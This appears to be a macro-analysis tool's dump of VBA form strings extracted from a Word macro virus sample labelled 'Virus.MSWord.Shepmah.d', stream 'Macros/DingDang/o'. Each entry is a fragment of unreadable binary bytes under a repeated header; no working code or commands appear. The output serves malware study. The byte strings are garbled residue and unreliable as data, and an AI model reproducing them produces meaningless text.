- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#j�4�]�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�K�z'7�[ynҀ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>#�	J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;Q�ܶ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ߡ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ŗO
'H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tqcx�p�Ґum
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0	Q|q-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0`���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ЏZu��PSxS�߀�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`ޡ9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`w�2��[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0`�Vٙ:�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P��M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�qp�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�5~��xrp�I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A
�Ё3G~�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�i&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�M0�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̳��R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����$��n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
�:/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�'��W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��Ja)�1g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�arap��uz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00K����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1ؕ\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�0�;D1Gº
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a	���`N�)�YA����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PU�(BI(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d��<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	۰)@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y`UHG�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�P�����p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ws��!��K���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F!�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@
��I�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`3'�]�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�7b��p	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/ry8c�9L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[B�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǀ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~pE�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YrM2œ�N2��ø.)/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����By
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#2Qq-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@3�Pw%��0B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4:�篷R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ�EC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`r+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����y����W�޾w�إK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�>y�օ뗑
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x���+���7j���{��߹z����G/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?|��݋�N���=}���$7~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���9��P���T�TT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]Tr��ɴ�N\�v2Q�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������<X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>xG���7�޽v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u<��<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O%���=xp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��.!E�����g�>�v�I�����^���{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=�F3~c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u�<�'�޻u�{.�A4�:�ƓzcW�㼺�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��/;��i�G�n�u���sG�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R���:v�\x�|z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�q�ڵ��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ї�u̱N)oޑ�(x�IP�r��F�|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ч��a̝
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�)Ͱu�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H��`L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ǝ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m6���~����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n� �4N�霨��,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2)p�������E,����ݺ�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��&�|�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$"1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�jg�#�1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M'A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	U�đ��{l��h�d�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����yX�+-Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@����X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%h.{�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3Vڟ�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8hd���Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g�l�=g���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Go$(`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R�t�,��sЌG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��؉6�,70��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mX�x7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ybx��#|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�m9�,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`8�UztR�a�s>��w�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��	ہ��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�0!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��}��M�s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gt�yY"w��tS��C��X��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�H#o.�H#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���',�ǡ��pց흗�Y����VH���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�h�*�O9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=��I�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�N����mk^���s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O����)��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G=gr�A���_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�f�S2Ʉ�e�W&�Sx�&zѧ���xO�^��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ޱ@2��]�㇫�2AW=0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_xA�a���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��!}a�
W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
